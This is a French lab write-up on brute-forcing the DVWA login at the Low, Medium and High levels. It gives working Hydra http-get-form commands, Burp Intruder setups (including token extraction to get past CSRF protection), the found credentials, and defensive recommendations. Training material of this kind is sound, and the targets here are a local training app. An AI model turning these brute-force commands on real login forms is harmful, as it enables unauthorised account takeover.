
---

# DVWA Brute Force (Low → Medium → High)

## 🎯 Low (Manuel)

### Test manuel

```
User ID : admin → "Welcome admin"
Mot de passe : ?
```

Tests effectués :
`root`, `test`, `admin`, `12345`, `123456`, `password`

**Solution :**

```
admin : password
```

---

## 🎯 Low (Manuel → Hydra)

### Solution avec Hydra

Hydra est un outil de pentest permettant de tester des mots de passe par force brute sur divers protocoles, dont les formulaires web HTTP.

Structure générale :

```
hydra [options] [cible] [module]
```

Exemple générique :

```
hydra -l username -P password-list target http-get-form "login-form:login-field=^USER^&password-field=^PASS^:F=failed-login-string"
```

### Préparation

```
locate rockyou.txt
locate john.lst
```

* Identifier le message d’échec et de succès
* Récupérer le cookie via F12 (navigateur)

### Commande Hydra (DVWA)

```
hydra -l admin -P /usr/share/wordlists/john.lst \
'http-get-form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=XXXXXXXX; security=low:F=Username and/or password incorrect.'
```


---

### Décomposition des options

* `-l` : utilisateur fixe (`admin`)
* `-P` : liste de mots de passe
* `http-get-form` : module pour formulaires HTTP GET
* `^USER^` / `^PASS^` : variables injectées par Hydra
* `F=` : chaîne indiquant un échec
* `H=Cookie` : session + niveau de sécurité DVWA

---

### Résultat

```
admin : password
```

Pour accélérer :
Créer un dictionnaire personnalisé (ex : `passwd.txt`) :

```
password
admin
123456
test
```

---

## 📈 Low avec Burp Suite

### Procédure

1. Activer **Intercept ON**
2. Effectuer un login dans DVWA
3. Vérifier la requête :

```
GET /vulnerabilities/brute/?username=admin&password=test&Login=Login HTTP/1.1
```

4. **Send to Intruder**
5. Définir le paramètre :

```
password=§test§
```

### Payloads

* Liste manuelle :

```
12345
123456
test
admin
password
root
```

* Ou fichier

### Analyse

* Lancer **Attack**
* Identifier le bon mot de passe via :

  * différence de longueur de réponse
  * ou via **Grep Match** → `Welcome`
  résultat : password

---

## 📈 Medium (Délai + Protection basique)

### Comprendre

* Ajout d’un délai de **2 secondes**
* Cookie :

```
security=medium
```

* Hydra devient plus lent

### Hydra (Medium)

```
hydra -l admin -P /usr/share/wordlists/john.lst \
'http-get-form://127.0.0.1:42001/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=XXXXXXXX; security=medium:F=Username and/or password incorrect.'
```

---

### Burp Intruder (Medium)

1. Capturer la requête
2. Même procédure que **Low**

Optimisation :

* **Settings → Resource Pool**
* Augmenter `Number of threads`

Détection :

* Différence de longueur de réponse
résultat password
---

## 🔥 High (CSRF Token dynamique)

* Présence d’un **token CSRF aléatoire**
* Fonction :

```
generateSessionToken();
```

* Hydra peu fiable dans ce cas

---

### Burp Intruder (High)

Requête :

```
GET /vulnerabilities/brute/?username=admin&password=test&Login=Login&user_token=XXXXXXXX HTTP/1.1
```

### Étapes

1. Envoyer dans **Intruder**
2. Attaque type **Sniper** (mot de passe)
3. Ajouter le **token** en second paramètre
4. Passer en attaque **Pitchfork**

---

### Configuration avancée

* **Payload Set 2** : type `Recursive Grep`
* **Settings → Grep Extract** :

  * Extraire le token automatiquement
* **Redirections** : `Always`
* **Resource Pool** :

  * Maximum requests = 1 (éviter désynchronisation token)

---

### Analyse

* Identifier le bon mot de passe via :

  * différence de longueur de réponse
résultat : password
---

# Bonnes pratiques & recommandations #
*Mesures de protection*
Authentification : Politique de mot de passe forte, MFA obligatoire, Désactiver comptes par défaut (admin)
Protection brute force : Limitation de tentatives (lockout), CAPTCHA
Rate limiting (IP / session)
*Sécurité applicative*
Implémenter correctement : CSRF tokens, délais progressifs
Ne pas divulguer : messages d’erreur explicites
Logs à surveiller : multiples échecs login, tentatives rapides (burst)
Réponse à incident : Blocage IP suspecte, Réinitialisation comptes compromis, Analyse logs (timeline)
Notification utilisateur

## 📚 Ressources

### 🔐 OWASP (référence principale)

* OWASP – Projet de référence en sécurité applicative

* OWASP Top 10
  → Catégorie A07: Identification and Authentication Failures (brute force, weak passwords)

* OWASP Testing Guide
  → Sections :

  * Authentication Testing
  * Credential Stuffing
  * Brute Force Attacks

* OWASP Cheat Sheet Series
  → À consulter :

  * Authentication Cheat Sheet
  * Password Storage Cheat Sheet
  * Session Management Cheat Sheet

---

### 🧪 Pentest / Offensive Security

* PortSwigger (éditeur de Burp Suite)

  * Web Security Academy (labs gratuits)
  * Modules sur :

    * Authentication bypass
    * Brute force
    * Rate limiting

* Hack The Box

  * Labs réalistes incluant brute force + bypass

* TryHackMe

  * Rooms pédagogiques (dont DVWA)

---

### 🔍 Défense / Blue Team

* MITRE – MITRE ATT&CK

  * Technique :

    * **T1110 – Brute Force**

* ANSSI

  * Guides sur :

    * Authentification
    * Journalisation
    * Détection d’attaques

---

### 🛠️ Bonnes pratiques techniques

* NIST SP 800-63B
  → Recommandations modernes :

  * MFA
  * abandon des règles complexes inutiles
  * protection contre brute force

* CIS

  * CIS Controls :

    * Control 6 : Access Control Management

---

### 📘 Documentation outils

* THC Hydra documentation officielle
* Burp Suite documentation PortSwigger

---

## ⚖️ À retenir

* OWASP → **méthodologie et risques**
* PortSwigger → **pratique offensive concrète**
* MITRE ATT&CK → **détection et classification SOC**
* NIST / ANSSI → **cadre défensif et conformité**

---

